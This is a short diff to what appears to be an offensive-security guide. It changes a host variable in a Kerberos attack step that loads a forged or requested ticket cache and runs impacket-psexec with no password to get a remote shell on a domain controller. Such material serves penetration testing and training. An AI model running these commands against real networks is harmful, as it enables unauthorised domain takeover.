@@ -55,5 +55,5 @@ impacket-ticketer -request \
 
 ```bash
 export KRB5CCNAME=$(pwd)/"$TARGET_USER.ccache"
-impacket-psexec -k -no-pass "$DOMAIN/$TARGET_USER@$DC_FQDN"
+impacket-psexec -k -no-pass "$DOMAIN/$TARGET_USER@$DC_HOST"
 ```
